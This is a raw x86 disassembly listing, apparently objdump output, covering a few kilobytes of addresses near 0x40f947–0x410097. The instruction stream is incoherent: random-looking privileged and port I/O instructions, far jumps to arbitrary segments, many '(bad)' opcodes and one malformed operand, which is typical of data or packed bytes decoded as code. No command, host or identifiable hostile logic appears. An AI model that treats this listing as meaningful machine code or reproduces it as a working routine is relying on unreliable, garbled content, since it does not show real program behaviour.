  40f947:	mov    dl,BYTE PTR [ebx+0x1b1ef644]
  40f94d:	mov    ss,ebp
  40f94f:	bound  esi,QWORD PTR [edi+0x41dfd68d]
  40f955:	mov    WORD PTR [edx-0x6515fcf1],ds
  40f95b:	test   DWORD PTR [esi+ebx*8-0x2b15762a],0xb4b024e3
  40f966:	or     DWORD PTR [eax+0x12],0xb66973b7
  40f96d:	sti    
  40f96e:	push   ds
  40f96f:	pop    ecx
  40f970:	rcr    DWORD PTR [ebx+0x23c46dbd],1
  40f976:	and    al,0x44
  40f978:	push   0xbcc922bb
  40f97d:	or     dl,dh
  40f97f:	jge    0x40f92f
  40f981:	adc    ch,cl
  40f983:	retf   
  40f984:	cmp    al,0xf9
  40f986:	rcl    BYTE PTR [ecx+edx*1+0x1bf97c5e],0x84
  40f98e:	out    dx,al
  40f98f:	adc    DWORD PTR [ecx],edi
  40f991:	stos   DWORD PTR es:[edi],eax
  40f992:	test   BYTE PTR [ebx-0x24420b9c],bl
  40f998:	xchg   esi,eax
  40f999:	inc    esp
  40f99a:	jo     0x40f9f0
  40f99c:	xchg   edi,eax
  40f99d:	or     edx,DWORD PTR [ecx+0x2522894c]
  40f9a3:	test   al,0xb6
  40f9a5:	xlat   BYTE PTR ds:[ebx]
  40f9a6:	stc    
  40f9a7:	hlt    
  40f9a8:	nop
  40f9a9:	cmp    bh,dl
  40f9ab:	sbb    al,0x74
  40f9ad:	je     0x40fa1d
  40f9af:	pop    ebx
  40f9b1:	dec    ecx
  40f9b2:	sub    al,0x75
  40f9b4:	test   BYTE PTR [edi-0x6a],ah
  40f9b7:	mov    gs,WORD PTR [edi]
  40f9b9:	ins    BYTE PTR es:[edi],dx
  40f9ba:	nop
  40f9bb:	ja     0x40f9fe
  40f9bd:	pop    edi
  40f9be:	je     0x40f94a
  40f9c0:	inc    edx
  40f9c1:	and    al,0xd0
  40f9c3:	das    
  40f9c4:	jl     0x40f976
  40f9c6:	data16 jp 0x40f9c7
  40f9c9:	or     edx,DWORD PTR [ecx-0x31db6930]
  40f9cf:	dec    esp
  40f9d0:	and    al,0x33
  40f9d2:	lea    edi,[ebx]
  40f9d4:	lock enterw 0xbd4e,0x1e
  40f9da:	inc    ebp
  40f9db:	in     al,dx
  40f9dc:	call   FWORD PTR [edx-0x3d52b89a]
  40f9e2:	sub    cl,BYTE PTR [ebx-0x14]
  40f9e5:	test   cl,0xbb
  40f9e8:	dec    eax
  40f9e9:	mov    eax,ds:0xc5e55e59
  40f9ee:	in     al,0xd8
  40f9f0:	jbe    0x40f9f4
  40f9f2:	cmp    al,0x2
  40f9f4:	inc    edi
  40f9f5:	pop    DWORD PTR [edi]
  40f9f7:	ldmxcsr DWORD PTR [ebx]
  40f9fa:	jb     0x40fa6d
  40f9fc:	mov    WORD PTR [eax-0x47],fs
  40f9ff:	jne    0x40f9b8
  40fa01:	cdq    
  40fa02:	push   ds
  40fa03:	inc    edx
  40fa04:	das    
  40fa05:	test   eax,0xbb60f045
  40fa0a:	mov    ds:0x9283c669,eax
  40fa0f:	mov    fs,WORD PTR [ebx+eax*8-0x7049b99a]
  40fa16:	pop    ds
  40fa17:	push   esp
  40fa18:	ins    BYTE PTR es:[edi],dx
  40fa19:	leave  
  40fa1a:	push   edx
  40fa1b:	mov    ecx,DWORD PTR [ecx-0x3f]
  40fa1e:	mov    esp,0xc6438aca
  40fa23:	repnz and edi,ebp
  40fa26:	lods   eax,DWORD PTR ds:[esi]
  40fa27:	rcl    DWORD PTR cs:[edx+0x36167787],0x76
  40fa2f:	outs   dx,BYTE PTR ds:[esi]
  40fa30:	pop    eax
  40fa31:	sbb    ch,BYTE PTR [eax+0x3]
  40fa34:	ins    DWORD PTR es:[edi],dx
  40fa35:	mov    edx,DWORD PTR [eax]
  40fa37:	lea    ebp,[ebx+0x5f]
  40fa3a:	jmp    0x40fa2f
  40fa3c:	rcl    BYTE PTR [edi],0xf1
  40fa3f:	leave  
  40fa40:	fnsave [ebx]
  40fa42:	je     0x40f9c9
  40fa44:	in     al,0x80
  40fa46:	dec    edi
  40fa47:	mov    ebx,0xfb90806c
  40fa4c:	xor    al,0xe1
  40fa4e:	out    0x33,eax
  40fa50:	mov    dh,0x4
  40fa52:	movhps xmm6,QWORD PTR ds:0x43cfb0c9
  40fa59:	shr    ebp,cl
  40fa5b:	ret    0x2828
  40fa5e:	inc    esi
  40fa5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa60:	mov    edi,0xbf76adde
  40fa65:	imul   ecx,DWORD PTR [esi+0x32],0xffffffec
  40fa69:	xchg   ebx,eax
  40fa6a:	xor    BYTE PTR [eax+0x64],ch
  40fa6d:	mov    eax,ds:0xca2ad6d8
  40fa72:	ss xchg esi,eax
  40fa74:	adc    eax,0xd49296ce
  40fa79:	push   ss
  40fa7a:	in     al,dx
  40fa7b:	sbb    al,0xa
  40fa7d:	rol    DWORD PTR [eax],cl
  40fa7f:	retf   
  40fa80:	leave  
  40fa81:	icebp  
  40fa82:	xchg   esp,eax
  40fa83:	mov    dl,0x5f
  40fa85:	and    bl,BYTE PTR [edx-0x57]
  40fa88:	test   eax,0x73cf593d
  40fa8d:	pop    ebp
  40fa8e:	je     0x40fac7
  40fa90:	into   
  40fa91:	sub    DWORD PTR [edx],0x9
  40fa94:	or     eax,0xd932b40c
  40fa9a:	in     eax,0x87
  40fa9c:	mov    bl,0x2f
  40fa9e:	sub    bh,BYTE PTR [esi+0x79]
  40faa1:	push   eax
  40faa2:	stos   BYTE PTR es:[edi],al
  40faa3:	pop    es
  40faa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faa5:	cmp    DWORD PTR [esi-0x4b34cd2b],eax
  40faab:	rep lods al,BYTE PTR ds:[esi]
  40faad:	sub    al,0x50
  40faaf:	push   eax
  40fab0:	dec    edx
  40fab1:	les    esp,FWORD PTR [ebx]
  40fab3:	lods   eax,DWORD PTR ds:[esi]
  40fab4:	inc    esi
  40fab5:	in     eax,0xf7
  40fab7:	jae    0x40fafa
  40fab9:	jle    0x40fb14
  40fabb:	push   es
  40fabc:	mov    ah,0xdc
  40fabe:	pop    edx
  40fabf:	mov    cl,0x93
  40fac1:	loope  0x40faae
  40fac3:	loope  0x40fa71
  40fac5:	adc    al,0x45
  40fac7:	cmp    DWORD PTR [edx+eax*2+0x66226ea5],edi
  40face:	adc    BYTE PTR [ebp-0x1bbf11ef],dh
  40fad4:	cmp    edx,DWORD PTR [esi+edi*2]
  40fad7:	shr    ebx,0x75
  40fada:	(bad)  
  40fadb:	sbb    ebp,DWORD PTR [esp+edi*2+0x5bf4714a]
  40fae2:	clc    
  40fae3:	into   
  40fae4:	dec    esi
  40fae5:	stos   BYTE PTR es:[edi],al
  40fae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fae7:	and    DWORD PTR [ecx],esp
  40fae9:	scas   al,BYTE PTR es:[edi]
  40faea:	sub    eax,0x19bf3725
  40faef:	mov    esp,0x4215db8f
  40faf4:	jg     0x40fb0c
  40faf6:	out    dx,eax
  40faf7:	mov    ch,0x1
  40faf9:	cld    
  40fafa:	pop    edi
  40fafb:	sub    BYTE PTR [eax-0xc99d373],0xaa
  40fb02:	xchg   ebx,eax
  40fb03:	hlt    
  40fb04:	jnp    0x40fb49
  40fb06:	mov    BYTE PTR [edx-0x743288d6],dl
  40fb0c:	jns    0x40fb03
  40fb0e:	mov    ah,0x2c
  40fb10:	or     BYTE PTR [eax],cl
  40fb12:	(bad)  
  40fb13:	mov    eax,fs:0x16c9a8d8
  40fb19:	shr    DWORD PTR fs:[ecx+esi*4-0x1089298b],cl
  40fb21:	mov    ds:0xb4791fd1,eax
  40fb26:	cld    
  40fb27:	cld    
  40fb28:	cwde   
  40fb29:	ficom  DWORD PTR [edx+0x58]
  40fb2c:	lea    esp,[ebp+0x2a]
  40fb2f:	sub    dl,dh
  40fb31:	cli    
  40fb32:	mov    ah,0xea
  40fb34:	pop    eax
  40fb35:	mov    eax,ds:0x9b9bd38d
  40fb3a:	stc    
  40fb3b:	icebp  
  40fb3c:	jg     0x40fb40
  40fb3e:	pop    edi
  40fb3f:	cli    
  40fb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb41:	js     0x40fade
  40fb43:	push   edi
  40fb44:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb46:	mov    ds,WORD PTR [esi+0x6a566ed0]
  40fb4c:	or     ebp,DWORD PTR [edx-0x66b1fe68]
  40fb52:	jmp    0x40fb71
  40fb54:	das    
  40fb55:	stos   DWORD PTR es:[edi],eax
  40fb56:	cmp    dl,BYTE PTR [eax+0x28]
  40fb59:	cmp    BYTE PTR [ebx],ch
  40fb5b:	pop    edi
  40fb5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb5d:	cdq    
  40fb5e:	cmp    BYTE PTR [edx+0x798411b8],dl
  40fb64:	xor    BYTE PTR [edi],bh
  40fb66:	sub    al,0x7d
  40fb68:	unpcklps xmm0,XMMWORD PTR [edx+0x56]
  40fb6c:	hlt    
  40fb6d:	(bad)  
  40fb6e:	adc    al,0x79
  40fb70:	push   ecx
  40fb71:	push   0x3a65fb46
  40fb76:	cli    
  40fb77:	into   
  40fb78:	xchg   ebx,eax
  40fb79:	div    DWORD PTR [esi-0x6c]
  40fb7c:	loopne 0x40fb14
  40fb7e:	pop    ss
  40fb7f:	or     eax,0x45c094c6
  40fb84:	and    DWORD PTR [ebx+0x1315803d],eax
  40fb8a:	jg     0x40fb32
  40fb8c:	aas    
  40fb8d:	mov    edi,0x83f54f82
  40fb92:	jae    0x40fb31
  40fb94:	xor    eax,0xf886bb3d
  40fb99:	sub    BYTE PTR [di],ah
  40fb9c:	or     BYTE PTR [esp+ecx*8-0x6d],dl
  40fba0:	xor    DWORD PTR [ecx+ecx*2-0x562c0d34],ecx
  40fba7:	mov    edi,0xd3da61cf
  40fbac:	cmp    ecx,DWORD PTR [ebx+0x16]
  40fbaf:	jnp    0x40fb51
  40fbb1:	inc    esi
  40fbb2:	fs repnz dec edx
  40fbb5:	cmp    bh,ch
  40fbb7:	pop    edi
  40fbb8:	mov    ebx,0x13800931
  40fbbd:	push   cs
  40fbbe:	or     ebp,edx
  40fbc0:	int3   
  40fbc1:	aas    
  40fbc2:	fst    st(5)
  40fbc4:	dec    esi
  40fbc5:	xchg   ebx,eax
  40fbc6:	push   edi
  40fbc7:	push   ebp
  40fbc8:	ficomp DWORD PTR [ecx-0x2caabd07]
  40fbce:	ret    0x48ee
  40fbd1:	inc    ebx
  40fbd2:	and    al,0xc0
  40fbd5:	sub    edx,esi
  40fbd7:	sub    ecx,DWORD PTR [edx]
  40fbd9:	push   es
  40fbda:	inc    ebp
  40fbdb:	xchg   edi,eax
  40fbdc:	sbb    BYTE PTR [eax+0x45918dd9],ch
  40fbe2:	lods   al,BYTE PTR ds:[esi]
  40fbe3:	mov    bl,BYTE PTR cs:[edx-0x77]
  40fbe7:	push   ecx
  40fbe8:	lea    esp,[eax-0x3dc35946]
  40fbee:	mov    cl,dh
  40fbf0:	stc    
  40fbf1:	(bad)  
  40fbf2:	loope  0x40fbe3
  40fbf4:	jo     0x40fbf6
  40fbf6:	pop    ds
  40fbf7:	push   es
  40fbf8:	retf   
  40fbf9:	cmc    
  40fbfa:	popa   
  40fbfb:	rcr    edi,1
  40fbfd:	in     al,0x49
  40fbff:	iret   
  40fc00:	cmp    bl,ch
  40fc02:	fsub   DWORD PTR [eax]
  40fc04:	pop    esp
  40fc05:	in     al,0x89
  40fc07:	ror    DWORD PTR [ecx],1
  40fc09:	dec    ecx
  40fc0a:	into   
  40fc0b:	push   0xffffffd8
  40fc0d:	sahf   
  40fc0e:	rcl    BYTE PTR [edi-0x7d],1
  40fc11:	and    DWORD PTR [esi+0x59],ebx
  40fc14:	dec    eax
  40fc15:	push   0x76
  40fc17:	dec    esi
  40fc18:	neg    DWORD PTR [ebx-0x64ecad1]
  40fc1e:	les    esi,FWORD PTR [edx+ebx*8]
  40fc21:	xor    eax,0x394c8a80
  40fc26:	lods   eax,DWORD PTR ds:[esi]
  40fc27:	shr    BYTE PTR [eax+0x44bd3123],0x3c
  40fc2e:	int3   
  40fc2f:	mov    edi,0xb52ab905
  40fc34:	test   BYTE PTR [ebp-0x6d3d005b],al
  40fc3a:	add    ebx,DWORD PTR ds:0xe2be0db3
  40fc40:	jecxz  0x40fc60
  40fc42:	test   al,0xb5
  40fc44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc45:	and    edi,DWORD PTR [eax]
  40fc47:	popa   
  40fc48:	into   
  40fc49:	das    
  40fc4a:	dec    edx
  40fc4b:	data16 icebp 
  40fc4d:	(bad)  
  40fc4e:	rcr    BYTE PTR [ecx],cl
  40fc50:	shr    DWORD PTR [ebp-0x18],cl
  40fc53:	into   
  40fc54:	popa   
  40fc55:	mov    al,ds:0x9ff774de
  40fc5a:	iret   
  40fc5b:	push   esi
  40fc5c:	gs (bad) 
  40fc5e:	cmc    
  40fc5f:	popf   
  40fc60:	add    eax,0x287c61f0
  40fc65:	push   eax
  40fc66:	out    dx,eax
  40fc67:	rol    BYTE PTR [esi-0x8],0xf8
  40fc6b:	out    dx,eax
  40fc6c:	jg     0x40fc41
  40fc6e:	or     eax,0x70f2357e
  40fc73:	mov    eax,0x9f708c6c
  40fc78:	xchg   esi,eax
  40fc79:	adc    eax,0xd82aa2b8
  40fc7e:	mov    ah,0x48
  40fc80:	jbe    0x40fcbd
  40fc82:	dec    edx
  40fc83:	jmp    0x4638:0x738f0161
  40fc8a:	cmp    DWORD PTR [ebx],ebx
  40fc8c:	add    DWORD PTR [edi+0x14],ebp
  40fc8f:	out    0xbf,eax
  40fc91:	jne    0x40fc2f
  40fc93:	in     al,dx
  40fc94:	inc    ebx
  40fc95:	jecxz  0x40fc51
  40fc97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc98:	pop    ebp
  40fc99:	test   BYTE PTR [edx-0x16f09c9b],cl
  40fc9f:	jle    0x40fcd1
  40fca1:	cmp    DWORD PTR [edi],0xffffffbf
  40fca4:	out    dx,eax
  40fca5:	aaa    
  40fca6:	pop    ecx
  40fca7:	gs sub eax,0x28588e0d
  40fcad:	push   ecx
  40fcae:	push   ds
  40fcaf:	and    BYTE PTR [esi+ebp*2+0x76fce39b],ch
  40fcb6:	ja     0x40fd2b
  40fcb8:	lods   eax,DWORD PTR ds:[esi]
  40fcb9:	cwde   
  40fcba:	fcmovu st,st(7)
  40fcbc:	mov    dl,0x40
  40fcbe:	cli    
  40fcbf:	adc    DWORD PTR [ecx-0x5fd40122],ecx
  40fcc5:	xchg   DWORD PTR ds:0x140db891,ebx
  40fccb:	jmp    0x92a1:0xdd614fe9
  40fcd2:	sti    
  40fcd3:	and    al,0x6c
  40fcd6:	repz retf 0xd74c
  40fcda:	gs iret 
  40fcdc:	jb     0x40fc63
  40fcde:	jg     0x40fc72
  40fce0:	sub    ebx,0x3ba32058
  40fce6:	arpl   WORD PTR [ecx+0x7807ec0a],cx
  40fcec:	or     ch,BYTE PTR [esi-0x38]
  40fcef:	and    eax,0xb2583108
  40fcf4:	mov    ebx,0x5ae889bb
  40fcf9:	jb     0x40fcbe
  40fcfb:	cmp    BYTE PTR [eax-0x107b8d7e],0x74
  40fd02:	sub    ecx,DWORD PTR [ebx]
  40fd04:	fbld   TBYTE PTR [ebx]
  40fd06:	call   0x825d1fea
  40fd0b:	dec    edi
  40fd0c:	add    ch,dh
  40fd0e:	leave  
  40fd0f:	mov    ebx,0x21585694
  40fd14:	mov    al,ds:0x3a2c415
  40fd19:	add    cl,al
  40fd1b:	iret   
  40fd1c:	imul   eax,DWORD PTR ds:0x6e6acc42,0x27
  40fd23:	add    al,0x44
  40fd25:	sub    BYTE PTR [ebp+0x75],al
  40fd28:	hlt    
  40fd29:	adc    al,BYTE PTR [eax-0x54]
  40fd2c:	sbb    dl,BYTE PTR [ecx]
  40fd2e:	loopne 0x40fd42
  40fd30:	arpl   WORD PTR [ebx],ax
  40fd32:	pop    es
  40fd33:	pushf  
  40fd34:	lahf   
  40fd35:	sub    eax,0x5a71bad7
  40fd3a:	nop
  40fd3b:	sbb    dh,dh
  40fd3d:	mov    edx,DWORD PTR [ebx]
  40fd3f:	cs icebp 
  40fd41:	es xor al,0x75
  40fd44:	pop    esi
  40fd45:	call   0xc5f318e4
  40fd4a:	mov    eax,ds:0x9c41f0b2
  40fd4f:	xchg   esi,eax
  40fd50:	ds adc eax,0xe8675ef4
  40fd56:	out    dx,eax
  40fd57:	cli    
  40fd58:	adc    al,0x16
  40fd5a:	dec    edi
  40fd5b:	js     0x40fdac
  40fd5d:	mov    al,0x26
  40fd5f:	inc    ebp
  40fd60:	xor    al,0x31
  40fd62:	push   eax
  40fd63:	pop    edx
  40fd64:	nop
  40fd65:	ror    DWORD PTR [eax],0xf1
  40fd68:	hlt    
  40fd69:	cdq    
  40fd6a:	mov    ds:0x9bda0592,al
  40fd6f:	adc    BYTE PTR [edi-0x66bea776],cl
  40fd75:	add    dh,BYTE PTR [ebx]
  40fd77:	fidivr WORD PTR [ecx+0x2c3eb4dd]
  40fd7d:	retf   0x428d
  40fd80:	jno    0x40fd61
  40fd82:	or     ebp,DWORD PTR [eax]
  40fd84:	out    dx,al
  40fd85:	pop    es
  40fd86:	lock fiadd DWORD PTR gs:[esi+0x4c]
  40fd8b:	push   ebp
  40fd8c:	ret    0x8bff
  40fd8f:	jecxz  0x40fd36
  40fd91:	sub    dh,BYTE PTR [eax-0x5c]
  40fd94:	stc    
  40fd95:	in     eax,dx
  40fd96:	xchg   edx,eax
  40fd97:	add    edi,ebx
  40fd99:	mov    edx,0x9b73a96a
  40fd9e:	ret    
  40fd9f:	fisubr DWORD PTR [edi]
  40fda1:	aaa    
  40fda2:	xor    eax,0x7fb33a79
  40fda7:	inc    ecx
  40fda8:	in     eax,0xa9
  40fdaa:	adc    DWORD PTR [ebx+0x49],esp
  40fdad:	outs   dx,BYTE PTR ds:[esi]
  40fdae:	dec    esi
  40fdaf:	pop    ecx
  40fdb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdb1:	stos   DWORD PTR es:[edi],eax
  40fdb2:	ds addr16 mov dl,0xd4
  40fdb6:	aad    0x55
  40fdb8:	xchg   BYTE PTR [edi-0x4917a80d],dl
  40fdbe:	add    eax,0x284c046d
  40fdc3:	dec    esp
  40fdc4:	cli    
  40fdc5:	shl    DWORD PTR [edx-0x2f02783f],1
  40fdcb:	mov    al,dh
  40fdcd:	mov    DWORD PTR [eax+0x59a9c0e0],ecx
  40fdd3:	add    eax,0x435815c5
  40fdd8:	or     bh,BYTE PTR [edi]
  40fdda:	lea    esp,[ebp-0xdfd590e]
  40fde0:	mov    bh,0x9f
  40fde2:	retf   0xb830
  40fde5:	or     BYTE PTR [edx+0x5e],al
  40fde8:	xor    BYTE PTR [eax],bh
  40fdea:	(bad)
  40fdef:	(bad)  
  40fdf0:	pop    esp
  40fdf1:	inc    ebx
  40fdf2:	pop    ebp
  40fdf3:	(bad)  
  40fdf4:	cli    
  40fdf5:	push   0x47
  40fdf7:	arpl   di,bx
  40fdf9:	pop    esp
  40fdfa:	push   edi
  40fdfb:	sbb    dh,BYTE PTR [esi]
  40fdfd:	inc    edi
  40fdfe:	leave  
  40fdff:	inc    eax
  40fe00:	or     DWORD PTR [eax+0x63],esp
  40fe03:	push   ds
  40fe04:	mov    bh,0x1a
  40fe06:	xchg   ebx,eax
  40fe07:	lahf   
  40fe08:	(bad)  
  40fe09:	dec    esp
  40fe0a:	mov    esp,0x8b5aec91
  40fe0f:	test   DWORD PTR [ecx],ecx
  40fe11:	or     DWORD PTR [esp+ebp*4-0x6a441665],edi
  40fe18:	dec    eax
  40fe19:	mov    edx,0x60973577
  40fe1e:	es push eax
  40fe20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe21:	mov    ah,0x87
  40fe23:	and    eax,0xc4487185
  40fe28:	push   ecx
  40fe29:	aas    
  40fe2a:	sti    
  40fe2b:	int3   
  40fe2c:	or     BYTE PTR [eax-0x5c18647e],dh
  40fe32:	mov    gs,WORD PTR [eax]
  40fe34:	pusha  
  40fe35:	js     0x40fde0
  40fe37:	push   esp
  40fe38:	mov    DWORD PTR [edx-0x80],esi
  40fe3b:	pop    ss
  40fe3c:	mov    dh,0xa4
  40fe3e:	cdq    
  40fe3f:	add    DWORD PTR [esi-0x591ef41a],esi
  40fe45:	rcl    DWORD PTR [edi],1
  40fe47:	jmp    0xd820ff25
  40fe4c:	push   ss
  40fe4d:	cmp    al,0xc3
  40fe4f:	ss ds shr eax,cl
  40fe53:	fadd   st(5),st
  40fe55:	dec    esi
  40fe56:	push   edx
  40fe57:	enter  0x8608,0xc7
  40fe5b:	xchg   esi,eax
  40fe5c:	inc    esp
  40fe5d:	scas   eax,DWORD PTR es:[edi]
  40fe5e:	ss stos DWORD PTR es:[edi],eax
  40fe60:	nop
  40fe61:	cld    
  40fe62:	sahf   
  40fe63:	and    al,0xa4
  40fe65:	cmp    ecx,DWORD PTR [ecx]
  40fe67:	fnsave [ecx+0x446add38]
  40fe6d:	jae    0x40fe10
  40fe6f:	std    
  40fe70:	loope  0x40fe76
  40fe72:	or     cl,ch
  40fe74:	sbb    dl,BYTE PTR [ecx]
  40fe76:	jmp    0xad8da253
  40fe7b:	xor    DWORD PTR [edx+0x3a665673],esi
  40fe81:	xchg   esi,eax
  40fe82:	push   esi
  40fe83:	cld    
  40fe84:	push   esi
  40fe85:	jmp    0x9c21:0xb05577c
  40fe8c:	push   0x2550213b
  40fe91:	stc    
  40fe92:	(bad)  
  40fe94:	mov    ebp,0x71f67a64
  40fe99:	scas   eax,DWORD PTR es:[edi]
  40fe9a:	xor    esi,DWORD PTR [ecx]
  40fe9c:	or     cl,ah
  40fe9e:	and    edx,eax
  40fea0:	mov    esi,0xe97d6abf
  40fea5:	cs inc esp
  40fea7:	daa    
  40fea8:	inc    edx
  40fea9:	jnp    0x40fe90
  40feab:	cs test cl,dl
  40feae:	dec    edx
  40feaf:	inc    eax
  40feb0:	ins    DWORD PTR es:[edi],dx
  40feb1:	in     al,0x40
  40feb3:	ret    
  40feb4:	jl     0x40fee7
  40feb6:	test   eax,0xd8f0162e
  40febb:	sub    esi,ebx
  40febd:	mov    WORD PTR [edx+0x6],?
  40fec0:	data16 stc 
  40fec2:	icebp  
  40fec3:	adc    esi,ecx
  40fec5:	sub    ebx,edx
  40fec7:	inc    esp
  40fec8:	enter  0x5b6e,0xf0
  40fecc:	push   edi
  40fecd:	xchg   ecx,eax
  40fece:	pop    ds
  40fecf:	adc    bl,BYTE PTR [ebx+0x61]
  40fed2:	shl    BYTE PTR [ecx-0x786742c2],0x16
  40fed9:	ret    0x5762
  40fedc:	and    ebp,DWORD PTR [edx+0x3f]
  40fedf:	cmc    
  40fee0:	push   edi
  40fee1:	mov    esp,0x9c4ac502
  40fee6:	test   eax,0xc74e8f28
  40feeb:	xlat   BYTE PTR ds:[ebx]
  40feec:	(bad)  
  40feed:	xor    edx,DWORD PTR [ecx-0x7a]
  40fef0:	imul   esi,DWORD PTR [edi+0x425f4581],0xffffffc1
  40fef7:	mov    al,0x8f
  40fef9:	mov    al,ds:0x33d350ad
  40fefe:	xor    eax,0x9746526a
  40ff03:	add    BYTE PTR [ebx+0x5b],0x50
  40ff07:	dec    edx
  40ff08:	mov    bl,0x2a
  40ff0a:	loopne 0x40ff10
  40ff0c:	pop    edi
  40ff0d:	rcl    esp,0x6
  40ff10:	pushf  
  40ff11:	xor    BYTE PTR [edx],al
  40ff13:	mov    ch,0xdf
  40ff15:	dec    esp
  40ff16:	data16 jle 0x40ff0f
  40ff19:	out    0xdb,al
  40ff1b:	hlt    
  40ff1c:	jno    0x40ff3a
  40ff1e:	mov    eax,ds:0x1bfd9df3
  40ff23:	xchg   BYTE PTR ds:0xc4991d11,dl
  40ff29:	cwde   
  40ff2a:	and    cl,BYTE PTR ds:0x734ad62d
  40ff30:	mov    bl,0x2f
  40ff32:	popa   
  40ff33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff34:	shr    esi,0x45
  40ff37:	aaa    
  40ff38:	push   ecx
  40ff39:	out    0x4f,eax
  40ff3b:	mov    dh,BYTE PTR [ebx-0x51]
  40ff3e:	sbb    DWORD PTR [edx],edi
  40ff40:	(bad)  
  40ff41:	push   si
  40ff43:	sbb    al,0x7b
  40ff45:	adc    al,0x96
  40ff47:	jo     0x40ff0c
  40ff49:	stc    
  40ff4a:	adc    esi,DWORD PTR [edx]
  40ff4c:	jl     0x40ff2b
  40ff4e:	and    DWORD PTR [edx+ebp*4+0xf1f8afe],esp
  40ff55:	ror    BYTE PTR [edx+0x1ab9af0b],cl
  40ff5b:	adc    al,0xe7
  40ff5d:	sahf   
  40ff5e:	cwde   
  40ff5f:	fwait
  40ff60:	dec    eax
  40ff61:	(bad)  
  40ff62:	fdivp  st(7),st
  40ff64:	mov    ch,0x8c
  40ff66:	mov    ecx,0xf60e6a50
  40ff6b:	mov    al,0xfd
  40ff6d:	ror    BYTE PTR [ebp-0x784831d6],0xbc
  40ff74:	test   eax,0xb238ea1f
  40ff79:	ret    0x352a
  40ff7c:	aam    0xcf
  40ff7e:	retf   
  40ff7f:	pop    es
  40ff80:	test   al,0x6e
  40ff82:	stos   BYTE PTR es:[edi],al
  40ff83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff84:	outs   dx,DWORD PTR ds:[esi]
  40ff85:	pushf  
  40ff86:	inc    edi
  40ff87:	bound  eax,QWORD PTR [edx-0x14a5d51e]
  40ff8d:	mov    esi,DWORD PTR [esi]
  40ff8f:	in     al,0xaa
  40ff91:	jl     0x40ffbc
  40ff93:	ficomp WORD PTR [eax-0x699a9a6c]
  40ff99:	clc    
  40ff9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff9b:	mov    ds:0xc7e6b046,eax
  40ffa0:	push   ss
  40ffa1:	aas    
  40ffa2:	xchg   ebp,eax
  40ffa3:	and    DWORD PTR [di],ebx
  40ffa6:	pop    edx
  40ffa7:	retf   
  40ffa8:	inc    esi
  40ffa9:	sub    edx,ebx
  40ffab:	fisttp WORD PTR [edi]
  40ffad:	mov    al,ds:0xf31624af
  40ffb2:	es popf 
  40ffb4:	js     0x40ffb4
  40ffb6:	bswap  eax
  40ffb8:	add    DWORD PTR [ecx-0x723f18f9],edi
  40ffbe:	out    0x9f,al
  40ffc0:	not    edx
  40ffc2:	push   edx
  40ffc3:	sub    esp,ebp
  40ffc5:	(bad)  
  40ffc7:	or     BYTE PTR fs:[edi+0x3e],dh
  40ffcb:	push   0xffffff91
  40ffcd:	cmp    BYTE PTR [ebx+0x16],ch
  40ffd0:	xchg   BYTE PTR ds:0xf30190c1,dh
  40ffd6:	dec    ebp
  40ffd7:	pop    edi
  40ffd8:	jo     0x40ff9a
  40ffda:	pop    es
  40ffdb:	retf   0x6321
  40ffde:	in     eax,dx
  40ffdf:	jb     0x410004
  40ffe1:	(bad)  
  40ffe2:	mov    dl,0xe0
  40ffe4:	out    dx,al
  40ffe5:	leave  
  40ffe6:	mov    eax,ds:0x31fcaf05
  40ffeb:	ds jmp 0x410007
  40ffee:	or     edx,DWORD PTR [ebp+0x35ba3bf8]
  40fff4:	mov    eax,ds:0x6b48b58a
  40fff9:	shl    DWORD PTR es:[ebx-0x5b],0x66
  40fffe:	pushf  
  40ffff:	mov    dh,0x46
  410001:	setae  BYTE PTR [ebp-0x66]
  410005:	lock jns 0x410057
  410008:	aaa    
  410009:	mov    ds:0x37833556,eax
  41000e:	aaa    
  41000f:	jl     0x41002f
  410011:	and    BYTE PTR [ebx],ch
  410013:	mov    eax,ds:0x380f396d
  410018:	mov    bh,0xff
  41001a:	jle    0x410024
  41001c:	bound  edi,QWORD PTR [edi]
  41001e:	out    0xeb,al
  410020:	test   eax,0xca0ead7a
  410025:	add    al,0x78
  410027:	fild   DWORD PTR [ebx-0x79]
  41002a:	ins    DWORD PTR es:[edi],dx
  41002b:	loopne 0x40ffeb
  41002d:	and    DWORD PTR [ebx+0x23],ebx
  410030:	iret   
  410031:	fdiv   DWORD PTR [ecx+eiz*2+0x3beeaf8b]
  410038:	jmp    0x410006
  41003a:	scas   eax,DWORD PTR es:[edi]
  41003b:	in     eax,dx
  41003c:	out    0x54,eax
  41003e:	addr16 enter 0x7b45,0x41
  410043:	(bad)  
  410044:	sub    ch,BYTE PTR [ebx+esi*4-0x5e]
  410048:	xlat   BYTE PTR ds:[ebx]
  410049:	and    al,0x90
  41004b:	test   DWORD PTR [edi],eax
  41004d:	je     0x4100bd
  41004f:	out    dx,eax
  410050:	push   0x77d1cacb
  410055:	add    ebx,DWORD PTR [ecx-0x2fd12c3b]
  41005b:	cmp    eax,0x466a4730
  410060:	repz dec esp
  410062:	retf   
  410063:	popa   
  410064:	fbstp  TBYTE PTR [esi-0x178b73b3]
  41006a:	push   0x52
  41006c:	pop    ebp
  41006d:	dec    eax
  41006e:	pop    eax
  41006f:	fcomp  QWORD PTR [ebp-0x6d91b6e7]
  410075:	cmc    
  410076:	pushf  
  410077:	mov    cl,0xd9
  410079:	fs adc eax,0x879f788
  41007f:	pop    ds
  410080:	fst    QWORD PTR [esi-0x4152587d]
  410086:	cwde   
  410087:	sbb    BYTE PTR [esi-0x19cbd6f5],ch
  41008d:	(bad)  
  41008e:	push   ss
  41008f:	mov    ds:0x52092173,eax
  410094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410095:	fwait
  410096:	popa   
  410097:	in     eax,dx
